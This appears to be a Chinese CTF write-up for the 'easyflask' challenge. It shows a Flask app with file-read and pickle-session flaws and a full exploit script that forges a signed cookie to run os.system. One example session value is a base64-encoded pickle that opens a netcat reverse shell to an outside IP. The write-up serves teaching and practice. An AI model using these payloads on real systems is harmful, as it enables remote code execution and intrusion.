## 0x01 easyflask

进入网页观察，发现文件读取，读到源码：

```
#!/usr/bin/python3.6 
import os 
import pickle 
from base64 import b64decode 
from flask import Flask, request, render_template, session 
app = Flask(__name__) 
app.config["SECRET_KEY"] = "glzjin22948575858jfjfjufirijidjitg3uiiuuh" 
User = type('User', (object,), {
    'uname': 'test', 
    'is_admin': 0, 
    '__repr__': lambda 
    o: o.uname, 
    })
 
@app.route('/', methods=('GET',)) 
def index_handler(): 
    if not session.get('u'): 
        u = pickle.dumps(User()) 
        session['u'] = u 
    return "/file?file=index.js" 
    
@app.route('/file', methods=('GET',)) 
def file_handler(): 
    path = request.args.get('file') 
    path = os.path.join('static', path) 
    if not os.path.exists(path) or os.path.isdir(path) \
    or '.py' in path or '.sh' in path or '..' in path or "flag" in path: 
        return 'disallowed' 
    with open(path, 'r') as fp: 
        content = fp.read() 
        return content 
    
@app.route('/admin', methods=('GET',)) 
def admin_handler(): 
    try: 
        u = session.get('u') 
        if isinstance(u, dict): 
            u = b64decode(u.get('b')) 
        u = pickle.loads(u) 
    except Exception: 
        return 'uhh?' 
    if u.is_admin == 1: 
        return 'welcome, admin' 
    else: 
        return 'who are you?' 

if __name__ == '__main__': app.run('0.0.0.0', port=80, debug=False)
```

其中发现了pickle反序列化，但是没有secret_key，去搜索/proc/self/environ目录下发现环境变量`secret_key`，

```
secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh
```

因而可以伪造session对目标进行pickle反序列化攻击



知识延伸：

pickle反序列化由`pickle.dump()`或`pickle.dumps()`与`pickle.load()`或`pickle.loads()`进行序列化与反序列化的操作，而由此生成的session结构则为

```
base64 + '.' + 时间戳 + '.' + 尾部，其中尾部为校验哈希值，base64格式形如：
{"u":{" b":"Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMiX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDEwLjEyMi4yMTguMjE1IDY2NjYgLWUgL2Jpbi9zaCcpIgpwMQp0cDIKUnAzCi4="}}
```

其中b的值为`pickle.dumps()`处理后的字段值再经过base64加密后得到的结果。

而与php反序列化相似的是，`pickle.loads()`或`pickle.load()`在进行反序列化时会默认调用函数`__reduce__`，因而可以覆写类中的`__reduce`函数产生RCE，如这次payload中的

```
class User(object):
    def __reduce__(self):
        import os
        cmd = "cat /flag > /tmp/heartless"
        return (os.system,(cmd,))
```

本题大致思路：

由于根目录无权限读，因而采用`__reduce__`在最高权限的情况下将flag文件复制至`/tmp/heartless`目录下进行读取，而`/tmp/heartless`读取权限则是公开。

exp：

```
# -*- coding: utf-8 -*-
"""
Created on Tue May 11 17:17:22 2021

@author: 86136
"""


#!/usr/bin/python3.6
import pickle 
import base64
from flask.sessions import SecureCookieSessionInterface
import requests
import re
import pickletools
Secret_key = "glzjin22948575858jfjfjufirijidjitg3uiiuuh" 

url = "http://9d391cae-8dad-40fe-8c4c-55bae82ce64e.node3.buuoj.cn"

class User(object):
    def __reduce__(self):
        import os
        cmd = "cat /flag > /tmp/heartless"
        return (os.system,(cmd,))

class FakeApp:
    secret_key = Secret_key

exp = {
       "b" : base64.b64encode(pickle.dumps(User()))
           }

fake_app = FakeApp()
session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(fake_app)
cookie = serializer.dumps({'u':exp})
print(cookie)

headers = {
    "Accept":"*/*",
    "Cookie":"session={0}".format(cookie)
    }


req = requests.get(url+"/admin", headers=headers)
print(req.text)

req = requests.get(url+"/file?file=/tmp/heartless", headers=headers)
print(req.text)
```

